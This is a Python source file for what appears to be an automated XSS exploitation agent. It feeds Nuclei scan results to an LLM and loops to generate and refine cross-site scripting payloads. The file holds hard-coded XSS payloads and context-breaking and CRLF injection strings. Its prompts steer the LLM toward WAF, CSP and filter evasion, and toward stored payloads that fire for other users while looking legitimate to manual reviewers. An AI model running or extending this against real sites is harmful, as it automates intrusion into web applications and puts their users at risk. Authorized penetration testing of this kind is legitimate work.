"""
Dynamic Payload Generation using LLM analysis
"""
import json
import logging
from datetime import datetime
from typing import Dict, Any, List, Optional

from ..models import PayloadAttempt, VulnerabilityContext, VerificationResult, ContextInfo, FailureReport
from ..utils.proxy_analyzer import ProxyTrafficAnalyzer


class DynamicPayloadAgent:
    """Agent responsible for generating and improving XSS payloads using LLM"""

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.proxy_analyzer = ProxyTrafficAnalyzer()

    async def generate_initial_payload(self, context: VulnerabilityContext) -> PayloadAttempt:
        """Generate first payload attempt for a vulnerability"""
        try:
            # Import here to avoid circular imports
            from ..llm_client import get_llm_client, get_default_model

            # Extract context information from Nuclei result
            context_info = self._extract_context_from_nuclei(context.nuclei_result)

            # Create payload generation prompt
            prompt = self._build_initial_payload_prompt(context.nuclei_result, context_info)

            # Use LLM for payload generation
            client = get_llm_client()
            model = get_default_model()
            response = client.simple_chat(model, prompt, temperature=0.7)
            payload_data = json.loads(self._clean_json_response(response))

            attempt = PayloadAttempt(
                attempt=1,
                payload=payload_data["payload"],
                reasoning=payload_data.get("reasoning", "Initial payload generated from Nuclei context"),
                result="pending",
                next_action=payload_data.get("next_action", "Test this payload and analyze results"),
                timestamp=datetime.now().isoformat()
            )

            self.logger.info(f"Generated initial payload: {attempt.payload[:50]}...")
            return attempt

        except Exception as e:
            self.logger.error(f"Error generating initial payload: {e}")
            # Final AI attempt with minimal prompt
            try:
                client = get_llm_client()
                minimal_prompt = "Generate one XSS payload. Return: {\"payload\": \"your_payload\"}"
                model = get_default_model()
                response = client.simple_chat(model, minimal_prompt, temperature=0.3)
                payload_data = json.loads(self._clean_json_response(response))

                return PayloadAttempt(
                    attempt=1,
                    payload=payload_data.get("payload", f"<svg onload='alert({datetime.now().second})'>"),
                    reasoning=f"Minimal AI generation after error: {e}",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )
            except:
                # Ultimate fallback with dynamic element
                return PayloadAttempt(
                    attempt=1,
                    payload=f'<svg onload="confirm({datetime.now().microsecond})">',
                    reasoning=f"All AI attempts failed: {e}",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )

    async def improve_payload(self, context: VulnerabilityContext, last_result: VerificationResult) -> PayloadAttempt:
        """Generate improved payload based on previous attempt failure"""
        try:
            from ..llm_client import get_llm_client, get_default_model

            # Analyze failure
            failure_report = self._analyze_failure(last_result)

            # Create improvement prompt
            prompt = self._build_improvement_prompt(context, last_result, failure_report)

            # Use LLM for payload improvement
            client = get_llm_client()
            model = get_default_model()
            response = client.simple_chat(model, prompt, temperature=0.8)
            payload_data = json.loads(self._clean_json_response(response))

            attempt = PayloadAttempt(
                attempt=context.current_attempt + 1,
                payload=payload_data["payload"],
                reasoning=payload_data.get("reasoning", "Improved payload based on failure analysis"),
                result="pending",
                next_action=payload_data.get("next_action", "Test improved payload"),
                timestamp=datetime.now().isoformat()
            )

            self.logger.info(f"Generated improved payload (attempt {attempt.attempt}): {attempt.payload[:50]}...")
            return attempt

        except Exception as e:
            self.logger.error(f"Error generating improved payload: {e}")
            # Generate AI fallback payload with simpler prompt
            try:
                client = get_llm_client()
                simple_prompt = f"""Generate a single XSS payload that bypasses basic filters. Context: {context.nuclei_result.template_name}
Return ONLY JSON: {{"payload": "your_payload_here", "reasoning": "Simple bypass strategy"}}"""

                model = get_default_model()
                response = client.simple_chat(model, simple_prompt, temperature=0.5)
                payload_data = json.loads(self._clean_json_response(response))

                return PayloadAttempt(
                    attempt=context.current_attempt + 1,
                    payload=payload_data["payload"],
                    reasoning=f"AI fallback: {payload_data.get('reasoning', 'Simple bypass attempt')}",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )
            except:
                # Last resort: dynamic unique payload
                unique_payload = f'<details open ontoggle="confirm({datetime.now().microsecond})">'
                return PayloadAttempt(
                    attempt=context.current_attempt + 1,
                    payload=unique_payload,
                    reasoning="AI failed, using dynamic unique payload",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )

    def _extract_context_from_nuclei(self, nuclei_result) -> ContextInfo:
        """Extract injection context from Nuclei result"""
        # Analyze the matched URL for context clues
        matched_url = nuclei_result.matched_url

        # Default context
        context_info = ContextInfo(location="unknown")

        # Simple heuristics to determine context
        if "?" in matched_url and "=" in matched_url:
            context_info.location = "query"
            # Try to extract parameter name
            query_part = matched_url.split("?", 1)[1]
            if "=" in query_part:
                param = query_part.split("=")[0].split("&")[0]
                context_info.param = param

        return context_info

    def _analyze_failure(self, result: VerificationResult) -> FailureReport:
        """Analyze why a payload attempt failed"""
        if result.error:
            return FailureReport(
                reason="syntax_error",
                details=f"Browser/network error: {result.error}",
                confidence=0.8
            )

        if not result.reflection_found:
            return FailureReport(
                reason="missing",
                details="Payload not found in response - might be filtered or blocked",
                confidence=0.7
            )

        if result.reflection_found and not result.executed:
            # Payload reflected but didn't execute - likely escaped/encoded
            page_content = result.page_content or ""
            if "&lt;" in page_content or "&gt;" in page_content:
                return FailureReport(
                    reason="escaped",
                    details="HTML entities detected - payload was HTML encoded",
                    confidence=0.9
                )
            elif "\\" in page_content:
                return FailureReport(
                    reason="escaped",
                    details="Backslash escaping detected",
                    confidence=0.8
                )
            else:
                return FailureReport(
                    reason="neutralized",
                    details="Payload reflected but execution blocked - possible CSP or filtering",
                    confidence=0.6
                )

        return FailureReport(
            reason="unknown",
            details="Unable to determine failure reason from available data",
            confidence=0.3
        )

    def _build_initial_payload_prompt(self, nuclei_result, context_info: ContextInfo) -> str:
        """Build prompt for initial payload generation"""
        return f"""You are an expert XSS payload generator. Generate a targeted XSS payload for this vulnerability.

VULNERABILITY DETAILS:
- Template: {nuclei_result.template_name}
- Severity: {nuclei_result.severity}
- URL: {nuclei_result.matched_url}
- Description: {nuclei_result.description}

CONTEXT ANALYSIS:
- Injection Location: {context_info.location}
- Parameter: {context_info.param or 'unknown'}

INSTRUCTIONS:
1. Analyze the injection context and vulnerability details
2. Generate a targeted XSS payload that is most likely to succeed
3. Provide reasoning for your payload choice
4. Suggest next steps for testing

Return ONLY valid JSON in this format:
{{
    "payload": "your_xss_payload_here",
    "reasoning": "explanation of why this payload should work",
    "next_action": "how to test this payload"
}}

Focus on creating a payload that matches the injection context. Consider URL encoding, attribute contexts, and common bypass techniques."""

    def _build_improvement_prompt(self, context: VulnerabilityContext, last_result: VerificationResult, failure_report: FailureReport) -> str:
        """Build prompt for payload improvement with detailed proxy traffic analysis"""

        # Get proxy traffic analysis if available
        proxy_analysis = ""
        bypass_suggestions = []

        if hasattr(last_result, 'proxy_captures') and last_result.proxy_captures:
            proxy_analysis = self.proxy_analyzer.format_for_llm(
                last_result.proxy_captures,
                context.nuclei_result.matched_url,
                context.attempt_history[-1].payload if context.attempt_history else ""
            )
            bypass_suggestions = self.proxy_analyzer.get_bypass_suggestions(
                last_result.proxy_captures,
                failure_report.reason
            )
        else:
            proxy_analysis = "No proxy traffic data available for detailed network analysis."

        # Build attempt history summary
        attempt_summary = []
        for i, attempt in enumerate(context.attempt_history, 1):
            attempt_summary.append(f"  Attempt {i}: {attempt.payload[:80]}{'...' if len(attempt.payload) > 80 else ''} -> {attempt.result}")

        history_text = "\n".join(attempt_summary) if attempt_summary else "No previous attempts"

        # Build bypass suggestions text
        suggestions_text = ""
        if bypass_suggestions:
            suggestions_text = "\n\nNETWORK-LEVEL BYPASS SUGGESTIONS:\n" + "\n".join([f"- {s}" for s in bypass_suggestions[:5]])

        return f"""You are an expert XSS penetration tester with deep knowledge of web application security. The previous payload failed - analyze the network-level evidence and generate a sophisticated bypass.

VULNERABILITY CONTEXT:
- Template: {context.nuclei_result.template_name}
- Target URL: {context.nuclei_result.matched_url}
- Current Attempt: {context.current_attempt + 1}/{context.max_attempts}
- Severity: {context.nuclei_result.severity}

ATTEMPT HISTORY:
{history_text}

FAILURE ANALYSIS:
- Reason: {failure_report.reason}
- Details: {failure_report.details}
- Confidence: {failure_report.confidence}

RESPONSE ANALYSIS:
- Reflection Found: {last_result.reflection_found}
- Execution Detected: {last_result.executed}
- Response Status: {last_result.response_status}
- Execution Method: {last_result.execution_method or 'None'}
- Console Logs: {len(last_result.console_logs or [])} entries
- Alerts Caught: {len(last_result.alerts_caught or [])}

{proxy_analysis}

{suggestions_text}

ADVANCED PAYLOAD GENERATION INSTRUCTIONS:
1. **Network-Level Analysis**: Use the proxy traffic data above to understand exactly how requests/responses are being processed
2. **Filtering Pattern Recognition**: Identify specific filtering mechanisms from headers, status codes, and response bodies
3. **Bypass Strategy Selection**: Choose bypass techniques that specifically target the detected protection mechanisms
4. **Encoding Strategy**: Use the most appropriate encoding based on the injection context and detected filters
5. **Alternative Vectors**: If traditional vectors fail, consider DOM-based, event-handler, or protocol-based approaches

PAYLOAD REQUIREMENTS:
- Must be specifically crafted to bypass the detected protection mechanisms
- Should use insights from network traffic analysis
- Must be different from all previous attempts
- Should target the root cause identified in failure analysis

Return ONLY valid JSON in this format:
{{
    "payload": "sophisticated_bypass_payload_here",
    "reasoning": "Detailed explanation: Based on network analysis showing [specific findings], this payload uses [specific technique] to bypass [specific protection]. The network data revealed [key insight] which suggests [bypass strategy].",
    "next_action": "Test this targeted bypass payload"
}}

ADVANCED BYPASS TECHNIQUES TO CONSIDER:
- **WAF Evasion**: Case variations, encoding combinations, protocol-specific bypasses
- **Filter Evasion**: Context breaking, polyglot payloads, alternative representations
- **CSP Bypasses**: JSONP, DOM manipulation, whitelisted domains
- **Encoding Bypasses**: Mixed encoding, double encoding, malformed encoding
- **Context Escaping**: Attribute breaking, quote escaping, comment breaking
- **Alternative Vectors**: HTML5 tags, SVG elements, MathML, XML entities
- **Protocol Exploitation**: Data URLs, javascript: protocol, about: protocol"""

    async def generate_initial_stored_payload(self, context: VulnerabilityContext) -> PayloadAttempt:
        """Generate first payload attempt for stored XSS vulnerability"""
        try:
            # Import here to avoid circular imports
            from ..llm_client import get_llm_client, get_default_model

            # Extract form context information
            form_info = self._extract_form_context(context.nuclei_result)

            # Create stored XSS payload generation prompt
            prompt = self._build_stored_payload_prompt(context.nuclei_result, form_info)

            # Use LLM for sophisticated stored XSS payload generation
            client = get_llm_client()
            model = get_default_model()
            response = client.simple_chat(model, prompt, temperature=0.7)
            payload_data = json.loads(self._clean_json_response(response))

            attempt = PayloadAttempt(
                attempt=1,
                payload=payload_data["payload"],
                reasoning=payload_data.get("reasoning", "AI-generated initial stored XSS payload"),
                result="pending",
                next_action=payload_data.get("next_action", "Test this stored XSS payload"),
                timestamp=datetime.now().isoformat()
            )

            self.logger.info(f"Generated AI stored XSS payload: {attempt.payload[:50]}...")
            return attempt

        except Exception as e:
            self.logger.error(f"Error generating stored XSS payload: {e}")
            # AI fallback for stored XSS
            try:
                client = get_llm_client()
                simple_prompt = """Generate a stored XSS payload for a web form guestbook.
Return ONLY JSON: {"payload": "your_payload_here", "reasoning": "Stored XSS strategy"}"""

                model = get_default_model()
                response = client.simple_chat(model, simple_prompt, temperature=0.5)
                payload_data = json.loads(self._clean_json_response(response))

                return PayloadAttempt(
                    attempt=1,
                    payload=payload_data["payload"],
                    reasoning=f"AI fallback stored XSS: {payload_data.get('reasoning')}",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )
            except:
                # Dynamic stored XSS payload
                dynamic_payload = f'<details open ontoggle="confirm({datetime.now().second})"><summary>Click</summary></details>'
                return PayloadAttempt(
                    attempt=1,
                    payload=dynamic_payload,
                    reasoning="Dynamic stored XSS payload - AI generation failed",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )

    async def improve_stored_payload(self, context: VulnerabilityContext, last_attempt) -> PayloadAttempt:
        """Improve stored XSS payload based on previous attempt failure"""
        try:
            from ..llm_client import get_llm_client, get_default_model

            # Create improvement prompt for stored XSS
            prompt = self._build_stored_improvement_prompt(context, last_attempt)

            # Use LLM for payload improvement
            client = get_llm_client()
            model = get_default_model()
            response = client.simple_chat(model, prompt, temperature=0.8)
            payload_data = json.loads(self._clean_json_response(response))

            attempt = PayloadAttempt(
                attempt=context.current_attempt + 1,
                payload=payload_data["payload"],
                reasoning=payload_data.get("reasoning", "AI-improved stored XSS payload"),
                result="pending",
                next_action=payload_data.get("next_action", "Test improved stored payload"),
                timestamp=datetime.now().isoformat()
            )

            self.logger.info(f"Improved stored XSS payload (attempt {attempt.attempt}): {attempt.payload[:50]}...")
            return attempt

        except Exception as e:
            self.logger.error(f"Error improving stored XSS payload: {e}")
            # AI fallback improvement
            try:
                client = get_llm_client()
                last_payload = last_attempt.payload if hasattr(last_attempt, 'payload') else ""
                simple_prompt = f"""The stored XSS payload "{last_payload}" failed. Generate an improved version.
Return ONLY JSON: {{"payload": "improved_payload", "reasoning": "Improvement strategy"}}"""

                model = get_default_model()
                response = client.simple_chat(model, simple_prompt, temperature=0.6)
                payload_data = json.loads(self._clean_json_response(response))

                return PayloadAttempt(
                    attempt=context.current_attempt + 1,
                    payload=payload_data["payload"],
                    reasoning=f"AI improvement: {payload_data.get('reasoning')}",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )
            except:
                # Generate alternative stored XSS approach with unique identifier
                unique_id = datetime.now().microsecond
                alt_payload = f'<marquee onstart="confirm({unique_id})">'
                return PayloadAttempt(
                    attempt=context.current_attempt + 1,
                    payload=alt_payload,
                    reasoning=f"Alternative stored XSS vector (ID:{unique_id}) - AI improvement failed",
                    result="pending",
                    timestamp=datetime.now().isoformat()
                )

    def _clean_json_response(self, response: str) -> str:
        """Clean LLM response to extract JSON from markdown code blocks and other formatting"""
        if not response:
            return ""

        cleaned = response.strip()

        # Handle markdown code blocks
        if cleaned.startswith("```json"):
            cleaned = cleaned[7:]  # Remove ```json
        elif cleaned.startswith("```"):
            cleaned = cleaned[3:]  # Remove ```

        if cleaned.endswith("```"):
            cleaned = cleaned[:-3]  # Remove trailing ```

        # Remove common prefixes from LLM responses
        prefixes_to_remove = [
            "Here's the JSON response:",
            "Here is the JSON:",
            "JSON:",
            "Response:",
            "Here's my response:",
            "Here is my response:",
            "The JSON response is:",
        ]

        for prefix in prefixes_to_remove:
            if cleaned.lower().startswith(prefix.lower()):
                cleaned = cleaned[len(prefix):].strip()

        # Look for JSON object boundaries if there's extra text
        start_idx = cleaned.find('{')
        end_idx = cleaned.rfind('}')

        if start_idx != -1 and end_idx != -1 and start_idx <= end_idx:
            cleaned = cleaned[start_idx:end_idx + 1]

        return cleaned

    def _extract_form_context(self, nuclei_result) -> Dict[str, Any]:
        """Extract form context information from stored XSS nuclei result"""
        form_context = {
            'type': 'guestbook_form',
            'fields': [],
            'method': 'POST',
            'url': nuclei_result.matched_url,
            'context_clues': []
        }

        # Extract form information from raw_data if available
        if hasattr(nuclei_result, 'raw_data') and nuclei_result.raw_data:
            raw_data = nuclei_result.raw_data
            form_context['fields'] = raw_data.get('fields', [])
            form_context['method'] = raw_data.get('method', 'POST')

            if 'form_id' in raw_data:
                form_context['form_id'] = raw_data['form_id']

            # Analyze field names for context
            field_names = raw_data.get('fields', [])
            for field in field_names:
                if any(keyword in field.lower() for keyword in ['message', 'comment', 'text', 'content']):
                    form_context['context_clues'].append(f'Text input field: {field}')
                elif any(keyword in field.lower() for keyword in ['name', 'user', 'author']):
                    form_context['context_clues'].append(f'Name input field: {field}')

        return form_context

    def _build_stored_payload_prompt(self, nuclei_result, form_info: Dict[str, Any]) -> str:
        """Build AI prompt for initial stored XSS payload generation"""

        # Build form context description
        form_description = f"Form URL: {form_info['url']}\n"
        form_description += f"Method: {form_info['method']}\n"

        if form_info['fields']:
            form_description += f"Fields: {', '.join(form_info['fields'])}\n"

        if form_info['context_clues']:
            form_description += f"Context Clues: {'; '.join(form_info['context_clues'])}\n"

        return f"""You are an expert stored XSS penetration tester with deep knowledge of web application security. Generate a sophisticated stored XSS payload for the following form context.

STORED XSS TARGET CONTEXT:
- Template: {nuclei_result.template_name}
- Severity: {nuclei_result.severity}
- Description: {nuclei_result.description}

FORM ANALYSIS:
{form_description}

STORED XSS PAYLOAD REQUIREMENTS:
1. **Persistence Focus**: The payload must be designed to persist in the application's data store (database, file, etc.)
2. **Context Awareness**: Consider the injection context (likely a text field in a guestbook/comment system)
3. **Evasion Strategy**: Account for common server-side filtering (HTML tag removal, entity encoding, etc.)
4. **Execution Trigger**: Ensure the payload executes when other users view the stored content
5. **Distinctiveness**: Use unique identifiers to confirm successful storage and execution

ADVANCED STORED XSS TECHNIQUES:
- **Context Breaking**: Escape input validation contexts with quote/attribute breaking
- **Filter Evasion**: Use alternative HTML5 tags, event handlers, and encoding techniques
- **Polyglot Payloads**: Create payloads that work across multiple contexts
- **DOM Manipulation**: Target client-side JavaScript frameworks and libraries
- **Social Engineering**: Consider payloads that might seem legitimate to bypass manual review

Generate a payload that specifically targets stored XSS scenarios with maximum persistence and execution potential.

Return ONLY valid JSON in this format:
{{
    "payload": "sophisticated_stored_xss_payload_here",
    "reasoning": "Detailed explanation: This stored XSS payload uses [specific technique] to achieve persistence by [storage method]. The payload targets [injection context] and employs [evasion strategy] to bypass common filters. Execution occurs when [trigger condition].",
    "next_action": "Submit payload to form and verify storage persistence"
}}

STORED XSS PAYLOAD EXAMPLES TO CONSIDER:
- **Event Handlers**: <img src=x onerror=alert('stored_xss')>
- **SVG Vectors**: <svg onload=alert('stored_xss')>
- **HTML5 Tags**: <details open ontoggle=alert('stored_xss')>
- **Context Breaking**: "><script>alert('stored_xss')</script>
- **Attribute Injection**: " onmouseover="alert('stored_xss')
- **CSS Injection**: <style>body{{background:url('javascript:alert("stored_xss")')}}</style>"""

    def _build_stored_improvement_prompt(self, context: VulnerabilityContext, last_attempt) -> str:
        """Build AI prompt for stored XSS payload improvement"""

        # Build attempt history
        attempt_summary = []
        for i, attempt in enumerate(context.attempt_history, 1):
            result = getattr(attempt, 'result', 'unknown')
            attempt_summary.append(f"  Attempt {i}: {attempt.payload[:60]}{'...' if len(attempt.payload) > 60 else ''} -> {result}")

        history_text = "\n".join(attempt_summary) if attempt_summary else "No previous attempts"

        last_payload = getattr(last_attempt, 'payload', '') if last_attempt else ''

        return f"""You are an expert stored XSS penetration tester. The previous stored XSS payload failed - analyze and generate a sophisticated bypass payload.

STORED XSS CONTEXT:
- Form: {context.nuclei_result.template_name}
- Target URL: {context.nuclei_result.matched_url}
- Current Attempt: {context.current_attempt + 1}/{context.max_attempts}
- Severity: {context.nuclei_result.severity}

ATTEMPT HISTORY:
{history_text}

FAILED PAYLOAD ANALYSIS:
- Last Payload: {last_payload}
- Failure Reason: Payload likely filtered, encoded, or removed by server-side protection

STORED XSS IMPROVEMENT STRATEGY:
1. **Analyze Previous Failure**: Consider why the last payload failed (filtering, encoding, context issues)
2. **Alternative Vectors**: Try different HTML tags, event handlers, or injection techniques
3. **Encoding Bypasses**: Use character encoding, entity encoding, or mixed case variations
4. **Context Adaptation**: Adapt to the specific injection context (attribute, text node, comment, etc.)
5. **Filter Evasion**: Bypass common stored XSS filters using advanced techniques

ADVANCED BYPASS TECHNIQUES FOR STORED XSS:
- **Alternative Events**: Use less common event handlers (ontoggle, onload, onfocus, etc.)
- **HTML5 Vectors**: Leverage newer HTML5 tags and attributes
- **Encoding Variations**: Mix different encoding techniques (hex, decimal, Unicode)
- **Context Breaking**: Break out of current context with quotes, brackets, or comments
- **Polyglot Techniques**: Create payloads that work in multiple contexts
- **CSS-based Vectors**: Use CSS expressions or background URLs for execution
- **Protocol Handlers**: Utilize javascript:, data:, or vbscript: protocols

Generate a payload that specifically addresses the failure pattern observed in previous attempts.

Return ONLY valid JSON in this format:
{{
    "payload": "improved_stored_xss_payload_here",
    "reasoning": "Improvement analysis: The previous payload failed because [failure analysis]. This improved payload uses [specific technique] to bypass [specific protection]. The new approach targets [injection method] and employs [evasion strategy] for better persistence.",
    "next_action": "Test improved stored XSS payload with enhanced bypass techniques"
}}

Focus on creating a payload that learns from the previous failure and employs a fundamentally different approach to achieve stored XSS execution.""".strip()

    def get_context_specific_guidance(self, context_info: ContextInfo) -> str:
        """Get guidance for specific injection contexts"""
        guidance = {
            "query": "Focus on URL encoding and breaking out of attribute contexts. Try: %3Cscript%3E, \"><script>, '>alert(1)<'",
            "post": "Try form data injection with various encodings. Consider: <script>alert(1)</script>, \"><img src=x onerror=alert(1)>",
            "json": "Break out of JSON context with quote escaping. Try: \"},alert(1),{\"a\":\"1, \"</script><script>alert(1)</script>",
            "header": "Header injection - try CRLF and header splitting. Consider: %0d%0a<script>alert(1)</script>",
            "path": "Path-based injection. Try: /<script>alert(1)</script>, ../<script>alert(1)</script>",
            "fragment": "Hash fragment injection. Try: #<script>alert(1)</script>, javascript:alert(1)",
            "unknown": "Context unclear - use general XSS payloads and try multiple encoding techniques. Consider: <script>alert(1)</script>, <img src=x onerror=alert(1)>, javascript:alert(1)"
        }
        return guidance.get(context_info.location, guidance["unknown"])